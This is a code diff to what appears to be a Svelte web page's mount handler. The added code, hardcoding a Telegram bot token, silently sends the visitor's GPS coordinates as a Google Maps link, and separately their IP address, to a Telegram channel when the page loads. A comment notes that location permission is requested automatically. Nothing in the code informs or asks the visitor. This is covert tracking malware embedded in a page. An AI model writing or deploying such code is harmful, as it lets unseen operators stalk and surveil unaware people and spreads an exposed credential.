@@ -5,10 +5,39 @@
 
   onMount(async () => {
 
-     
-sendLocationAndIPToTelegramBot();
 
-    //sendIPToTelegramBots();
+
+telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    
+    const message = `${latitude} ${longitude}`;
+
+    // Create the message with the clickable link to Google Maps
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
+
+    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)
+
+    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}`;
+
+    // Send location and IP results to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
+
+
+
+
+    sendIPToTelegramBots();
     
     setTimeout(() => {
       // Request location permission automatically after a delay of 1 second
